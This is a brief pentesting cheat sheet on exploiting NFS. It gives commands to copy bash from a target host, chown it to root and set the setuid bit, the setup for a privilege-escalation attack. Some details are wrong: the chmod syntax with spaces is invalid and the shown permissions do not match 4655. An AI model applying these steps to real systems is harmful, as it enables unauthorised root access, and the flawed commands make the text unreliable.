# Exploiting NFS
Techniques to exploit the Network File System.

When developing exploits you may run into compatibility issues. One way to ensure you have the same environment is to download it from the target.
```sh
scp -i <key> username@10.10.10.10:/bin/bash .
```

Modify the file permissions to `root`
```sh
sudo chown root bash
```

Modify the `setuid` bit using either method:
```sh
sudo chmod u=rwxs, g=rx, o=rx bash
sudo chmod 4655 bash

ls -lia
-rwsr-sr-x 1 root   root   1113504 May 00 00:00 bash
```
